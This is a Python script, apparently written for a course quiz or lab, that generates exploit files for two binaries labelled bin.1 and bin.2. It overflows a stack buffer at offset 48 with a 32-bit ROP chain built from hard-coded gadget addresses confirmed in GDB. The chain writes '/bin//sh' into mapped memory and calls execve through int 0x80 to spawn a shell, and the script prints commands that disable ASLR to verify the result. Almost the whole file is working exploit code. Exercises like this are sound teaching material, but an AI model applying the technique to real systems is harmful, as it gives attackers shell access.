#!/usr/bin/env python3
"""
BSA set exploit generator — Quiz 4
bin.1 and bin.2: NX on, mmap+movb ROP, OFFSET=48
GDB confirmed gadget_base = 0x070493e0 (formula was off by 8)

Confirmed gadget table (from GDB memory dump at runtime):
  +0x00: 31 c0 c3  xor eax,eax; ret
  +0x03: 58 5b c3  pop eax; pop ebx; ret
  +0x06: 89 03 c3  mov [ebx],eax; ret
  +0x09: 31 c9 c3  xor ecx,ecx; ret
  +0x0c: 89 c3 c3  mov ebx,eax; ret
  +0x0f: 31 d2 c3  xor edx,edx; ret
  +0x12: b0 0b c3  mov al,0xb; ret
  +0x15: cd 80 c3  int 0x80; ret
"""
import struct, os

def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)

gb      = 0x070493e0   # confirmed via GDB (formula gives 0x070493e8, off by 8)
WR_ADDR = 0x07049500   # mmap_base(0x07049000) + 0x500

G_XOR_EAX_EAX     = gb + 0x00   # 31 c0 c3
G_POP_EAX_POP_EBX = gb + 0x03   # 58 5b c3
G_MOV_EBXPTR_EAX  = gb + 0x06   # 89 03 c3
G_XOR_ECX_ECX     = gb + 0x09   # 31 c9 c3
G_MOV_EBX_EAX     = gb + 0x0c   # 89 c3 c3
G_XOR_EDX_EDX     = gb + 0x0f   # 31 d2 c3
G_MOV_AL_0B       = gb + 0x12   # b0 0b c3
G_INT_80          = gb + 0x15   # cd 80 c3

OFFSET = 48   # lea -0x2c(%ebp) → 0x2c + 4 = 48

def build_chain(offset, wr):
    chain  = b'A' * offset
    chain += p32(G_POP_EAX_POP_EBX) + b'/bin' + p32(wr)        + p32(G_MOV_EBXPTR_EAX)
    chain += p32(G_POP_EAX_POP_EBX) + b'//sh' + p32(wr+4)      + p32(G_MOV_EBXPTR_EAX)
    chain += p32(G_POP_EAX_POP_EBX) + p32(wr) + p32(0x41414141) + p32(G_MOV_EBX_EAX)
    chain += p32(G_XOR_ECX_ECX)
    chain += p32(G_XOR_EDX_EDX)
    chain += p32(G_XOR_EAX_EAX)
    chain += p32(G_MOV_AL_0B)
    chain += p32(G_INT_80)
    return chain

chain = build_chain(OFFSET, WR_ADDR)
data  = str(len(chain)).encode() + b' ' + chain

base = os.path.expanduser('~/bsa')

with open(f'{base}/exploit.1', 'wb') as f:
    f.write(data)
print(f'[+] exploit.1 written — payload {len(chain)} bytes')

with open(f'{base}/exploit.2', 'wb') as f:
    f.write(data)
print(f'[+] exploit.2 written — payload {len(chain)} bytes')

print(f'\n[*] gadget_base: {hex(gb)}  (CONFIRMED via GDB)')
print(f'[*] OFFSET:      {OFFSET}   (lea -0x2c(%ebp) → 0x2c+4)')
print(f'[*] WR_ADDR:     {hex(WR_ADDR)} (mmap_base+0x500)')
print(f'\n[*] Same gadget order for both bin.1 and bin.2')
print(f'[*] Run verify:')
print(f"    echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb {base}/bin.1 {base}/exploit.1")
print(f"    echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb {base}/bin.2 {base}/exploit.2")
